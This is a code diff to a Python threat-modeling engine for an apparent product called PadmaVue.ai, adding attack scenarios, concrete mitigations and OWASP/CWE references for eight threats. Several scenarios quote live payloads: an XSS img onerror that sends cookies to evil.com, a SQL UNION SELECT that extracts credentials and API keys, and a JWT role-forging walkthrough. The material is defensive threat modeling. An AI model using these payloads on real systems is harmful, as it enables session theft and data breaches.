@@ -435,7 +435,20 @@ class PASTAEngine:
                 "entry_point": "Web UI",
                 "attack_vector": "Social engineering leading to credential compromise",
                 "affected_assets": ["User credentials", "Session tokens"],
-                "motivation": "Account takeover for financial gain"
+                "motivation": "Account takeover for financial gain",
+                "scenario": "An attacker creates a convincing clone of the PadmaVue.ai login page at padmavue-ai.com (typosquatting). They send targeted emails to security analysts claiming 'Your threat model export is ready - click to download'. When victims enter credentials on the fake site, the attacker captures them and immediately uses them to access the real PadmaVue.ai instance, exporting all threat intelligence data before the victim realizes the deception.",
+                "specific_mitigations": [
+                    "Implement FIDO2/WebAuthn hardware key authentication for all users",
+                    "Deploy DMARC, DKIM, and SPF email authentication to prevent domain spoofing",
+                    "Enable login anomaly detection alerting on new device/location combinations",
+                    "Require MFA via authenticator app (not SMS) for all account access",
+                    "Implement phishing-resistant authentication with passkeys"
+                ],
+                "references": [
+                    "[OWASP A07:2021 - Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)",
+                    "[CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)",
+                    "[MITRE ATT&CK T1566 - Phishing](https://attack.mitre.org/techniques/T1566/)"
+                ]
             },
             {
                 "id": "PASTA-T002",
@@ -444,7 +457,20 @@ class PASTAEngine:
                 "entry_point": "REST API",
                 "attack_vector": "Excessive API calls to extract bulk data",
                 "affected_assets": ["Customer PII", "Business data"],
-                "motivation": "Data theft or competitive intelligence"
+                "motivation": "Data theft or competitive intelligence",
+                "scenario": "A disgruntled employee with valid API credentials writes a Python script that iterates through all project IDs (IDOR vulnerability) calling GET /api/projects/{id}/export. Without rate limiting, they extract 50,000 threat models containing proprietary security analysis in 30 minutes. The data is uploaded to a personal cloud storage before their access is revoked, later appearing on a competitor's platform.",
+                "specific_mitigations": [
+                    "Implement per-user rate limiting: 100 requests/minute, 1000/hour via Redis-backed limiter",
+                    "Add anomaly detection on export endpoints alerting on >10 exports/hour per user",
+                    "Require re-authentication (step-up auth) for bulk data export operations",
+                    "Implement data loss prevention (DLP) scanning on API responses for PII patterns",
+                    "Use UUIDs instead of sequential IDs to prevent enumeration attacks"
+                ],
+                "references": [
+                    "[OWASP API4:2023 - Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)",
+                    "[CWE-799: Improper Control of Interaction Frequency](https://cwe.mitre.org/data/definitions/799.html)",
+                    "[CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)"
+                ]
             },
             {
                 "id": "PASTA-T003",
@@ -453,7 +479,20 @@ class PASTAEngine:
                 "entry_point": "REST API",
                 "attack_vector": "Malicious SQL in input parameters",
                 "affected_assets": ["Database", "Customer PII"],
-                "motivation": "Data breach, system compromise"
+                "motivation": "Data breach, system compromise",
+                "scenario": "An attacker discovers the /api/threats/search endpoint accepts a 'query' parameter. They submit `' UNION SELECT username, password_hash, email, api_key, null FROM users--` which bypasses the intended threat search and returns all user credentials. Using the extracted API keys, they authenticate as admin users and modify threat severity scores across all projects to hide critical vulnerabilities from exported reports.",
+                "specific_mitigations": [
+                    "Use SQLAlchemy ORM with bound parameters exclusively - zero raw SQL queries",
+                    "Implement allowlist input validation: search queries must match ^[a-zA-Z0-9\\s\\-_]{1,100}$",
+                    "Deploy parameterized stored procedures for complex queries",
+                    "Enable PostgreSQL pg_stat_statements to log and detect injection patterns",
+                    "Run SQLMap in CI/CD pipeline to detect injection vulnerabilities before deployment"
+                ],
+                "references": [
+                    "[OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)",
+                    "[CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)",
+                    "[OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)"
+                ]
             },
             {
                 "id": "PASTA-T004",
@@ -462,7 +501,20 @@ class PASTAEngine:
                 "entry_point": "Web UI",
                 "attack_vector": "XSS to steal session tokens",
                 "affected_assets": ["Session tokens", "User accounts"],
-                "motivation": "Account takeover"
+                "motivation": "Account takeover",
+                "scenario": "An attacker discovers that threat descriptions are rendered without sanitization. They create a threat with the description: `<img src=x onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\">`. When an admin views this threat in the review page, the XSS payload executes, sending their session cookie to the attacker's server. The attacker replays the cookie to hijack the admin session and gains full access to all organizational threat models.",
+                "specific_mitigations": [
+                    "Implement Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'",
+                    "Set HttpOnly and Secure flags on all session cookies (SameSite=Strict)",
+                    "Use DOMPurify library to sanitize all user-generated content before rendering",
+                    "Implement output encoding using React's built-in JSX escaping (avoid dangerouslySetInnerHTML)",
+                    "Deploy Trusted Types API to prevent DOM-based XSS in modern browsers"
+                ],
+                "references": [
+                    "[OWASP A03:2021 - Injection (XSS)](https://owasp.org/Top10/A03_2021-Injection/)",
+                    "[CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)",
+                    "[OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)"
+                ]
             },
             {
                 "id": "PASTA-T005",
@@ -471,7 +523,20 @@ class PASTAEngine:
                 "entry_point": "Admin Interface",
                 "attack_vector": "Exploiting authorization flaws",
                 "affected_assets": ["System configuration", "All data"],
-                "motivation": "Unauthorized access to sensitive functions"
+                "motivation": "Unauthorized access to sensitive functions",
+                "scenario": "A standard user notices their JWT contains `{\"role\": \"user\", \"org_id\": \"org_123\"}`. Using jwt.io, they decode and modify the payload to `{\"role\": \"admin\", \"org_id\": \"org_456\"}`. Since the backend uses HS256 with a weak secret ('padmavue_secret_key'), they brute-force the secret and re-sign the token. The modified JWT grants them admin access to a different organization's threat models, allowing them to view competitor security assessments.",
+                "specific_mitigations": [
+                    "Use RS256 asymmetric JWT signing - private key never leaves the server",
+                    "Validate role claims server-side against database on EVERY request",
+                    "Implement organization-scoped access control: verify org_id matches user's organization",
+                    "Use short-lived access tokens (15 min) with secure refresh token rotation",
+                    "Add JWT fingerprinting binding tokens to client TLS certificate or device ID"
+                ],
+                "references": [
+                    "[OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)",
+                    "[CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)",
+                    "[CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)"
+                ]
             },
             {
                 "id": "PASTA-T006",
@@ -480,7 +545,20 @@ class PASTAEngine:
                 "entry_point": "Dependencies",
                 "attack_vector": "Compromised third-party library",
                 "affected_assets": ["Source code", "Customer data"],
-                "motivation": "Persistent backdoor access"
+                "motivation": "Persistent backdoor access",
+                "scenario": "A nation-state actor compromises the maintainer account of 'mermaid-parser', a transitive dependency of PadmaVue.ai's diagram generation. They publish version 2.1.1 containing a backdoor that exfiltrates environment variables (including OPENAI_API_KEY and DATABASE_URL) to a C2 server during diagram rendering. The malicious version is automatically pulled during the next `npm install` in CI/CD, and the backdoor persists undetected for 3 months.",
+                "specific_mitigations": [
+                    "Pin exact dependency versions in package-lock.json and requirements.txt (no ^ or ~)",
+                    "Enable GitHub Dependabot alerts and npm audit in CI/CD pipeline with blocking on critical",
+                    "Use Socket.dev or Snyk to detect supply chain attacks in real-time",
+                    "Implement Software Bill of Materials (SBOM) generation with CycloneDX",
+                    "Run dependencies in isolated containers with no network access during build"
+                ],
+                "references": [
+                    "[OWASP A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)",
+                    "[CWE-1104: Use of Unmaintained Third Party Components](https://cwe.mitre.org/data/definitions/1104.html)",
+                    "[SLSA Framework - Supply Chain Security](https://slsa.dev/)"
+                ]
             },
             {
                 "id": "PASTA-T007",
@@ -489,7 +567,20 @@ class PASTAEngine:
                 "entry_point": "All public endpoints",
                 "attack_vector": "Volumetric and application-layer attacks",
                 "affected_assets": ["System availability"],
-                "motivation": "Service disruption"
+                "motivation": "Service disruption",
+                "scenario": "A hacktivist group targets PadmaVue.ai after the platform is used to analyze their organization's security. They launch a multi-vector attack: 1) Volumetric UDP flood at 50Gbps saturating the network, 2) HTTP GET flood with 100,000 requests/second to /api/analyze, 3) Slowloris attack holding 10,000 connections open. The 4 Uvicorn workers are exhausted, legitimate users receive 503 errors, and the service is down for 6 hours during a critical client demo.",
+                "specific_mitigations": [
+                    "Deploy behind Cloudflare Pro or AWS Shield Advanced for volumetric DDoS protection",
+                    "Implement rate limiting: 100 req/min per IP using FastAPI-Limiter with Redis backend",
+                    "Configure nginx with limit_conn_zone and limit_req_zone directives",
+                    "Set Uvicorn --limit-concurrency 100 --timeout-keep-alive 5 to prevent Slowloris",
+                    "Enable auto-scaling with Kubernetes HPA based on request queue depth"
+                ],
+                "references": [
+                    "[OWASP - Denial of Service](https://owasp.org/www-community/attacks/Denial_of_Service)",
+                    "[CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)",
+                    "[AWS Shield Best Practices](https://docs.aws.amazon.com/waf/latest/developerguide/ddos-overview.html)"
+                ]
             },
             {
                 "id": "PASTA-T008",
@@ -498,7 +589,20 @@ class PASTAEngine:
                 "entry_point": "Admin Interface",
                 "attack_vector": "Phishing + lateral movement",
                 "affected_assets": ["All data", "System availability"],
-                "motivation": "Financial extortion"
+                "motivation": "Financial extortion",
+                "scenario": "An organized crime group sends a spear-phishing email to a PadmaVue.ai admin with a malicious PDF attachment. The PDF exploits a zero-day in the preview renderer, installing a RAT. The attackers use the RAT to dump credentials from memory, finding the PostgreSQL admin password. They connect to the database, encrypt all tables with AES-256, delete backups accessible via the compromised credentials, and demand 50 BTC for the decryption key.",
+                "specific_mitigations": [
+                    "Implement 3-2-1 backup strategy: 3 copies, 2 media types, 1 offsite (immutable S3 with Object Lock)",
+                    "Deploy EDR solution (CrowdStrike, SentinelOne) on all admin workstations",
+                    "Use separate credentials for backup systems not accessible from production",
+                    "Enable PostgreSQL row-level encryption for sensitive threat data",
+                    "Implement network segmentation isolating database tier from admin workstations"
+                ],
+                "references": [
+                    "[CISA Ransomware Guide](https://www.cisa.gov/stopransomware)",
+                    "[CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)",
+                    "[MITRE ATT&CK - Ransomware](https://attack.mitre.org/techniques/T1486/)"
+                ]
             }
         ]
         
@@ -676,7 +780,11 @@ class PASTAEngine:
                 "compliance_mappings": {
                     "NIST_800_53": self._map_to_nist(threat),
                     "OWASP_ASVS": self._map_to_asvs(threat)
-                }
+                },
+                # Enhanced fields from scenario-driven schema
+                "scenario": threat.get("scenario", ""),
+                "specific_mitigations": threat.get("specific_mitigations", []),
+                "references": threat.get("references", [])
             }
             
             prioritized_threats.append(prioritized_threat)
@@ -774,45 +882,95 @@ class PASTAEngine:
         threat: Dict[str, Any],
         scenario: Dict[str, Any]
     ) -> List[str]:
-        """Generate countermeasures for a threat"""
+        """Generate PadmaVue.ai-specific technical countermeasures for a threat"""
+        # First, check if threat has specific_mitigations from enhanced schema
+        if threat.get("specific_mitigations"):
+            return threat["specific_mitigations"]
+        
         countermeasures = []
-        
         attack_vector = threat.get("attack_vector", "").lower()
+        title = threat.get("title", "").lower()
         
-        if "phishing" in attack_vector or "social" in attack_vector:
+        if "phishing" in attack_vector or "social" in attack_vector or "credential" in title:
             countermeasures.extend([
-                "Implement security awareness training",
-                "Deploy email security gateway with anti-phishing",
-                "Enable MFA for all accounts"
+                "Implement FIDO2/WebAuthn hardware key authentication for admin accounts",
+                "Deploy DMARC (p=reject), DKIM, and SPF email authentication on your domain",
+                "Enable login anomaly detection with alerts on new device/location combinations",
+                "Require TOTP-based MFA (Google Authenticator) - never SMS-based 2FA",
+                "Conduct quarterly phishing simulations with KnowBe4 or similar platform"
             ])
         
-        if "injection" in attack_vector or "sql" in attack_vector:
+        if "injection" in attack_vector or "sql" in attack_vector or "sql" in title:
             countermeasures.extend([
-                "Use parameterized queries exclusively",
-                "Implement input validation and sanitization",
-                "Deploy Web Application Firewall (WAF)"
+                "Use SQLAlchemy ORM with bound parameters exclusively - zero raw SQL queries",
+                "Validate all inputs against allowlist regex: ^[a-zA-Z0-9\\s\\-_]{1,100}$",
+                "Enable PostgreSQL pg_stat_statements for query logging and injection detection",
+                "Deploy AWS WAF or Cloudflare WAF with OWASP ModSecurity CRS 3.x ruleset",
+                "Run SQLMap scans in CI/CD pipeline to detect injection before deployment"
             ])
         
-        if "session" in attack_vector or "xss" in attack_vector:
+        if "session" in attack_vector or "xss" in attack_vector or "hijack" in title:
             countermeasures.extend([
-                "Implement Content Security Policy (CSP)",
-                "Use HttpOnly and Secure cookie flags",
-                "Implement proper output encoding"
+                "Set Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'",
+                "Configure cookies with HttpOnly, Secure, and SameSite=Strict flags",
+                "Use DOMPurify library to sanitize all user-generated content before rendering",
+                "Implement Trusted Types API for DOM-based XSS prevention in modern browsers",
+                "Enable Subresource Integrity (SRI) for all external scripts and stylesheets"
             ])
         
-        if "privilege" in attack_vector or "authorization" in attack_vector:
+        if "privilege" in attack_vector or "authorization" in attack_vector or "escalation" in title:
             countermeasures.extend([
-                "Implement principle of least privilege",
-                "Regular access reviews and certification",
-                "Role-based access control (RBAC)"
+                "Validate user roles server-side on EVERY request using JWT claims verified against DB",
+                "Implement RBAC middleware with deny-by-default: @require_role(['admin']) decorator",
+                "Use RS256 asymmetric JWT signing - private key never leaves the server",
+                "Add organization-scoped access control: verify org_id matches user's organization",
+                "Implement quarterly access reviews with automated deprovisioning for inactive users"
             ])
         
-        # Default countermeasures if none specific
+        if "supply chain" in attack_vector or "dependency" in attack_vector or "supply" in title:
+            countermeasures.extend([
+                "Pin exact dependency versions in package-lock.json (no ^ or ~ version ranges)",
+                "Enable GitHub Dependabot alerts with auto-merge for patch updates",
+                "Run npm audit and pip-audit in CI/CD with build failure on high/critical CVEs",
+                "Generate SBOM using CycloneDX and scan with Dependency-Track",
+                "Use Socket.dev or Snyk to detect supply chain attacks in real-time"
+            ])
+        
+        if "ddos" in attack_vector or "volumetric" in attack_vector or "ddos" in title:
+            countermeasures.extend([
+                "Deploy behind Cloudflare Pro or AWS Shield Advanced for L3/L4 DDoS protection",
+                "Implement rate limiting: 100 req/min per IP using FastAPI-Limiter with Redis",
+                "Configure nginx limit_conn_zone (100 connections) and limit_req_zone (10 req/s)",
+                "Set Uvicorn --limit-concurrency 100 --timeout-keep-alive 5 to prevent Slowloris",
+                "Enable Kubernetes HPA auto-scaling based on request queue depth metrics"
+            ])
+        
+        if "ransomware" in attack_vector or "lateral" in attack_vector or "ransomware" in title:
+            countermeasures.extend([
+                "Implement 3-2-1 backup strategy with immutable S3 Object Lock (WORM)",
+                "Deploy EDR (CrowdStrike/SentinelOne) on all workstations with 24/7 SOC monitoring",
+                "Use separate credentials for backup systems not accessible from production network",
+                "Enable PostgreSQL Transparent Data Encryption (TDE) for data at rest",
+                "Implement network segmentation with zero-trust architecture between tiers"
+            ])
+        
+        if "api" in attack_vector or "exfiltration" in attack_vector or "abuse" in title:
+            countermeasures.extend([
+                "Implement per-user rate limiting: 100 req/min, 1000/hour via Redis-backed limiter",
+                "Add anomaly detection alerting on >10 exports/hour per user via Datadog/Splunk",
+                "Require step-up authentication (re-enter password) for bulk data export operations",
+                "Use UUIDs instead of sequential IDs to prevent IDOR enumeration attacks",
+                "Implement DLP scanning on API responses for PII patterns (SSN, credit cards)"
+            ])
+        
+        # Default countermeasures if none specific matched
         if not countermeasures:
             countermeasures = [
-                "Implement defense in depth strategy",
-                "Enable comprehensive logging and monitoring",
-                "Conduct regular security assessments"
+                "Implement defense in depth with multiple security layers",
+                "Enable structured JSON logging to CloudWatch/Datadog with security event alerting",
+                "Conduct quarterly penetration testing by certified third-party (CREST/OSCP)",
+                "Implement security headers: X-Content-Type-Options, X-Frame-Options, HSTS",
+                "Deploy runtime application self-protection (RASP) for real-time attack detection"
             ]
         
         return countermeasures
@@ -867,6 +1025,92 @@ class PASTAEngine:
             mappings.extend(["V6.1.1", "V8.1.1"])
         
         return list(set(mappings))
+    
+    def get_threat_references(self, threat: Dict[str, Any]) -> List[str]:
+        """
+        Get OWASP/CWE references for a threat based on its characteristics.
+        Returns markdown-formatted links for display in UI.
+        """
+        # If threat already has references, return them
+        if threat.get("references"):
+            return threat["references"]
+        
+        references = []
+        title = threat.get("title", "").lower()
+        attack_vector = threat.get("attack_vector", "").lower()
+        combined = f"{title} {attack_vector}"
+        
+        # SQL Injection
+        if "sql" in combined or "injection" in combined:
+            references.extend([
+                "[OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)",
+                "[CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)"
+            ])
+        
+        # XSS / Session
+        if "xss" in combined or "session" in combined or "hijack" in combined:
+            references.extend([
+                "[OWASP A03:2021 - Injection (XSS)](https://owasp.org/Top10/A03_2021-Injection/)",
+                "[CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)"
+            ])
+        
+        # Authentication / Credential
+        if "auth" in combined or "credential" in combined or "phishing" in combined:
+            references.extend([
+                "[OWASP A07:2021 - Auth Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)",
+                "[CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)"
+            ])
+        
+        # Access Control / Privilege
+        if "privilege" in combined or "access" in combined or "escalation" in combined:
+            references.extend([
+                "[OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)",
+                "[CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)"
+            ])
+        
+        # Supply Chain
+        if "supply" in combined or "dependency" in combined or "third-party" in combined:
+            references.extend([
+                "[OWASP A08:2021 - Software Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)",
+                "[CWE-1104: Use of Unmaintained Components](https://cwe.mitre.org/data/definitions/1104.html)"
+            ])
+        
+        # DDoS / DoS
+        if "ddos" in combined or "dos" in combined or "denial" in combined:
+            references.extend([
+                "[OWASP - Denial of Service](https://owasp.org/www-community/attacks/Denial_of_Service)",
+                "[CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)"
+            ])
+        
+        # Ransomware
+        if "ransomware" in combined or "extortion" in combined:
+            references.extend([
+                "[CISA Ransomware Guide](https://www.cisa.gov/stopransomware)",
+                "[CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)"
+            ])
+        
+        # API Abuse / Exfiltration
+        if "api" in combined or "exfiltration" in combined or "abuse" in combined:
+            references.extend([
+                "[OWASP API4:2023 - Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)",
+                "[CWE-799: Improper Control of Interaction Frequency](https://cwe.mitre.org/data/definitions/799.html)"
+            ])
+        
+        # AI/LLM specific
+        if "prompt" in combined or "llm" in combined or "agent" in combined:
+            references.extend([
+                "[OWASP LLM01:2025 - Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)",
+                "[OWASP LLM06:2025 - Excessive Agency](https://genai.owasp.org/llmrisk/llm06-excessive-agency/)"
+            ])
+        
+        # Default references if none matched
+        if not references:
+            references = [
+                "[OWASP Top 10](https://owasp.org/Top10/)",
+                "[CWE Top 25](https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html)"
+            ]
+        
+        return list(set(references))  # Remove duplicates
     
     def _get_most_affected_assets(self, threats: List[Dict]) -> List[str]:
         """Get most frequently affected assets"""
